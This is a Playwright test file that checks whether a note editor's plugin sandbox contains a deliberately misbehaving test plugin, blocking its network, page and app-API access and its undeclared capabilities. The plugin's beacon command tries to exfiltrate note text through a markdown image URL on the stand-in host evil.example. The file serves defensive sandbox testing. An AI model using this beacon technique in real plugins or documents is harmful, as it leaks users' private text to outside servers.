import { createServer } from 'node:http';
import { mkdir, rm, writeFile } from 'node:fs/promises';
import type { AddressInfo } from 'node:net';
import path from 'node:path';
import { expect, test, _electron as electron, type Page } from '@playwright/test';
import { packagedExecutable } from './packaged-app';

const MANIFEST = {
  schemaVersion: 2,
  id: 'local.test.shout',
  name: 'Shout',
  version: '1.0.0',
  runtime: 'sandboxed',
  description: 'Upper-cases the note, and tries what it should not.',
  activation: { startup: false, events: ['editor.ready'], hotkeys: [] },
  capabilities: ['editor.read', 'editor.transform'],
  lifecycle: ['activate', 'deactivate'],
  commands: [
    { id: 'shout.upper', title: 'Shout: upper-case the note' },
    { id: 'shout.probe', title: 'Shout: probe the sandbox' },
    { id: 'shout.overreach', title: 'Shout: overreach' },
    { id: 'shout.beacon', title: 'Shout: send a beacon' },
  ],
  settings: [],
  hotkeys: [],
  editorExtensions: [],
  uiExtensions: [],
};

// Upper-cases the note through the editor's port, and reports what else it
// can reach: the network, the page, the app's own API.
const main = (port: number) => `
export async function activate(ctx) {
  ctx.registerCommand('shout.upper', async () => {
    const markdown = await ctx.port.getMarkdown();
    await ctx.port.replaceMarkdown(markdown.toUpperCase());
  });
  ctx.registerCommand('shout.probe', async () => {
    let network = 'blocked';
    try { await fetch('http://127.0.0.1:${port}/fetch'); network = 'reached'; } catch {}
    // Refused by policy without throwing, a socket is checked by what the
    // server below receives.
    try { new WebSocket('ws://127.0.0.1:${port}/socket'); } catch {}
    await new Promise((resolve) => setTimeout(resolve, 300));
    const page = typeof document === 'undefined' ? 'none' : 'present';
    const app = typeof self.notoWorkspace === 'undefined' && typeof self.notoDesktop === 'undefined' ? 'none' : 'present';
    const markdown = await ctx.port.getMarkdown();
    await ctx.port.replaceMarkdown(markdown + '\\nprobe network=' + network + ' page=' + page + ' app=' + app + '\\n');
  });
  ctx.registerCommand('shout.beacon', async () => {
    let answer = 'added';
    try {
      const markdown = await ctx.port.getMarkdown();
      await ctx.port.replaceMarkdown(markdown + '\\n![](https://evil.example/c?d=' + encodeURIComponent(markdown.slice(0, 20)) + ')\\n');
    } catch (error) { answer = 'refused ' + String(error.message).split(':')[0]; }
    const markdown = await ctx.port.getMarkdown();
    await ctx.port.replaceMarkdown(markdown + '\\nbeacon ' + answer + '\\n');
  });
  // Decorating the editor was never declared.
  ctx.registerCommand('shout.overreach', async () => {
    let answer = 'allowed';
    try { await ctx.port.setSemanticFocus(true); } catch (error) { answer = 'refused ' + String(error.message).split(':')[0]; }
    const markdown = await ctx.port.getMarkdown();
    await ctx.port.replaceMarkdown(markdown + '\\noverreach ' + answer + '\\n');
  });
}
`;

async function runCommand(page: Page, words: string, option: RegExp) {
  await page.keyboard.press(`${process.platform === 'darwin' ? 'Meta' : 'Control'}+Shift+KeyP`);
  await expect(page.getByTestId('palette-input')).toBeFocused();
  await page.keyboard.type(words);
  await expect(page.getByRole('option', { name: option })).toHaveAttribute('aria-selected', 'true');
  await page.keyboard.press('Enter');
}

test('a plugin in the plugins folder runs sandboxed: it changes the note through what it declared, and reaches nothing else', async () => {
  const workspace = path.join(process.cwd(), 'test-results', 'user-plugins');
  await rm(workspace, { recursive: true, force: true });
  const pluginDir = path.join(workspace, 'user-data', 'plugins', 'user', MANIFEST.id);
  await mkdir(pluginDir, { recursive: true });
  await writeFile(path.join(pluginDir, 'manifest.json'), JSON.stringify(MANIFEST, null, 2), 'utf8');
  // Anything the plugin reaches on the network lands here.
  const reached: string[] = [];
  const server = createServer((request, response) => { reached.push(`http ${request.url}`); response.end('ok'); });
  server.on('upgrade', (request, socket) => { reached.push(`socket ${request.url}`); socket.destroy(); });
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  await writeFile(path.join(pluginDir, 'main.js'), main((server.address() as AddressInfo).port), 'utf8');
  const file = path.join(workspace, 'note.md');
  await writeFile(file, '# quiet\n\nsoft words\n', 'utf8');

  const app = await electron.launch({
    executablePath: packagedExecutable(),
    args: [`--user-data-dir=${path.join(workspace, 'user-data')}`, `--open=${file}`],
  });
  try {
    const page = await app.firstWindow();
    await page.waitForSelector('[data-testid="noto-editor"]', { state: 'visible', timeout: 30_000 });
    await page.setViewportSize({ width: 1280, height: 900 });

    await page.getByTestId('settings-toggle').click();
    await page.getByTestId('pref-plugins').click();
    const row = page.locator('.plugin-row').filter({ has: page.locator('strong', { hasText: 'Shout' }) });
    await expect(row).toContainText('Upper-cases the note');
    await row.click();
    const detail = page.locator('.plugin-detail').filter({ has: page.locator('strong', { hasText: 'Shout' }) });
    await detail.locator('button.plugin-primary').click();
    await detail.locator('button.plugin-primary').click();
    await page.getByTestId('settings-close').click();

    const editor = page.locator('.canvas-slot:not([hidden]) .ProseMirror');
    await runCommand(page, 'upper-case', /upper-case the note/i);
    await expect(editor.locator('h1')).toHaveText('QUIET');
    await expect(editor.locator('p').first()).toHaveText('SOFT WORDS');

    // No network, no page, no app API.
    await runCommand(page, 'probe', /probe the sandbox/i);
    await expect(editor).toContainText('probe network=blocked page=none app=none');
    expect(reached).toEqual([]);

    // It may not put a web address in the note, where the page would fetch it.
    await runCommand(page, 'beacon', /send a beacon/i);
    await expect(editor).toContainText('beacon refused PLUGIN_NETWORK_DENIED');
    await expect(editor.locator('img[src*="evil.example"]')).toHaveCount(0);

    // A capability it did not declare is refused by name.
    await runCommand(page, 'overreach', /overreach/i);
    await expect(editor).toContainText('overreach refused PLUGIN_CAPABILITY_DENIED');
  } finally {
    await app.close();
    server.close();
  }
});
